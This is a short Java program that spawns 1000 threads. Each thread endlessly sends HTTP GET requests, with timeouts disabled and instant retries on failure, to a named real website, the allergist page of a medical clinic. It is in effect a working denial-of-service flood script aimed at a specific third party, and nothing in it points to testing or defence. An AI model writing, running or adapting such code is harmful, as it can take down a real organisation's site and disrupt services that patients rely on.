import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;

public class HeyBabe implements Runnable {

    public static void main(String[] args) {
        extracted();
    }

    private static void extracted() {
        for (int i = 0; i < 1000; i++) {
            final HeyBabe heyBabe = new HeyBabe();
            final Thread thread = new Thread(heyBabe);

            thread.start();
        }
    }

    public static void hey() {
        double v = Math.random() * 49 + 1;
        Unirest.setTimeouts(0, 0);
        HttpResponse<String> response = null;
        try {
            response = Unirest.get("https://medlabspb.ru/allergolog-immunolog/")
                    .asString();
        } catch (Exception e) {
            hey();
        }

        System.out.println(response);
    }

    public static void loop() {
        try {
            while (true) {
                hey();
                System.out.println("+");
            }
        } catch (Exception e) {
            while (true) {
                hey();
                System.out.println("++");
            }
        }
    }

    @Override
    public void run() {
        try {
            loop();
        } catch (Exception e) {
            loop();
        }
    }
}
